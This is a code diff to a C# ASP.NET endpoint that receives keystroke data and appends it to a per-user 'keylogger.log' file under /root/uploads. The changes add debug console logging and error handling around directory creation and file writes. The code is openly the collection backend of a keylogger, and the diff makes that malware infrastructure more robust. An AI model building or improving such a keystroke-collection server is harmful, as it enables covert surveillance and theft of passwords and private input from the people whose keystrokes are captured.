@@ -32,8 +32,11 @@ app.UseRouting();
 app.MapPost("/log", async (HttpRequest request) =>
 {
     var username = request.Query["username"].ToString();
+    Console.WriteLine($"[DEBUG_LOG] Received log request for username: '{username}'");
+
     if (string.IsNullOrWhiteSpace(username))
     {
+        Console.WriteLine("[DEBUG_LOG] Error: Username is required.");
         return Results.BadRequest("Username is required.");
     }
 
@@ -42,18 +45,32 @@ app.MapPost("/log", async (HttpRequest request) =>
 
     if (string.IsNullOrEmpty(content))
     {
+        Console.WriteLine("[DEBUG_LOG] Error: No content received.");
         return Results.BadRequest("No content.");
     }
 
     // Sanitize username to prevent directory traversal
     var safeUsername = Path.GetFileName(username);
+    Console.WriteLine($"[DEBUG_LOG] Safe username: '{safeUsername}'");
 
     // Detect if we are running on Windows or Linux to set the base path accordingly
     var isWindows = RuntimeInformation.IsOSPlatform(OSPlatform.Windows);
     var baseUploadPath = isWindows ? "C:\\root\\uploads" : "/root/uploads";
     
     var userUploadPath = Path.Combine(baseUploadPath, safeUsername);
-    Directory.CreateDirectory(userUploadPath);
+    try 
+    {
+        if (!Directory.Exists(userUploadPath))
+        {
+            Console.WriteLine($"[DEBUG_LOG] Creating directory: {userUploadPath}");
+            Directory.CreateDirectory(userUploadPath);
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[DEBUG_LOG] Failed to create directory {userUploadPath}: {ex.Message}");
+        return Results.Problem("Failed to create directory.");
+    }
  
     var filePath = Path.Combine(userUploadPath, "keylogger.log");
 
@@ -63,7 +80,14 @@ app.MapPost("/log", async (HttpRequest request) =>
     try
     {
         // Append the keystrokes to the file
+        Console.WriteLine($"[DEBUG_LOG] Appending content to {filePath}");
         await File.AppendAllTextAsync(filePath, content);
+        Console.WriteLine($"[DEBUG_LOG] Successfully wrote to {filePath}");
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"[DEBUG_LOG] Failed to write to file {filePath}: {ex.Message}");
+        return Results.Problem("Failed to write to file.");
     }
     finally
     {
